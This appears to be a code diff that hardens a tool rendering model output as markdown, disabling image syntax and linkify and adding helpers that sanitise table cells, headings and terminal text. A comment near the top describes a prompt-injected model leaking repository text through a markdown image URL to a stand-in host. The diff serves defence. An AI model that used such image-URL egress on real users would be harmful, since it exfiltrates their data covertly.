@@ -17,7 +17,7 @@ from .llm import extract_mermaid  # noqa: F401  (re-exported for custom renderer
 # coderay-q2r.53: image syntax is off. `![x](https://host/p?leak=...)` became a
 # live <img> that fires on page open, an egress channel from repo text via
 # a prompt-injected model. html=False does not cover it.
-_MD = MarkdownIt("commonmark", {"html": False, "linkify": True, "breaks": False}).enable(["table"]).disable("image")
+_MD = MarkdownIt("commonmark", {"html": False, "linkify": False, "breaks": False}).enable(["table"]).disable("image")
 
 @dataclass(frozen=True)
 class Section:
@@ -105,6 +105,28 @@ def split_cards(markdown):
     if title is not None:
         cards.append((title.strip(), "\n".join(body).strip()))
     return cards
+
+_CONTROL = re.compile(r"[\x00-\x08\x0b-\x1f\x7f]")
+
+
+def md_cell(text):
+    """Model text made safe inside a markdown pipe table: pipes escaped and
+    newlines flattened, so one cell cannot split or close the row."""
+    return str(text or "").replace("|", "\\|").replace("\r", " ").replace("\n", " ").strip()
+
+
+def md_heading(text):
+    """Model text made safe as a markdown heading: one line, so a newline in it
+    cannot end the heading and let the next line pose as one."""
+    return " ".join(str(text or "").split())
+
+
+def printable(text, limit):
+    """Model text for the terminal: control characters removed, whitespace
+    collapsed, cut to `limit`, so a reply cannot move the cursor or fake a
+    line of the run's own output."""
+    return " ".join(_CONTROL.sub("", str(text or "")).split())[:limit]
+
 
 def card(header_md, body_md):
     return (
@@ -331,7 +353,7 @@ def _render_card_page(analysis, name, shared):
 def _render_card_markdown(analysis, name, shared):
     theme = analysis.THEME
     title = theme.page_name(shared, name) if theme.page_name else name
-    parts = [f"# {title}: {theme.title_suffix}\n"]
+    parts = [f"# {md_heading(title)}: {theme.title_suffix}\n"]
 
     preamble = theme.md_preamble(shared)
     if preamble:
